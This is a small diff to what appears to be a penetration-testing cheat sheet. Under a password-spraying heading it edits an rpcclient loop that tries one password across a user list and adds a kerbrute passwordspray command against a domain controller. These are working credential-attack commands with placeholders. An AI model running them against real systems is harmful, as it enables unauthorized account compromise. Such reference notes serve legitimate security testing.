@@ -79,5 +79,6 @@ rpcclient -U '<user>' --password '<password>' <ip>
 ### Password Spraying
 
 ```bash
-for u in $(cat users.txt);do rpcclient -U "$u%" --password '<password>' -c "getusername;quit" <ip> | grep Authority; done
+for u in $(cat <users-list>);do rpcclient -U "$u%" --password '<password>' -c "getusername;quit" <ip> | grep Authority; done
+kerbrute passwordspray -d <domain> --dc <ip> <users-list>  '<password>'
 ```
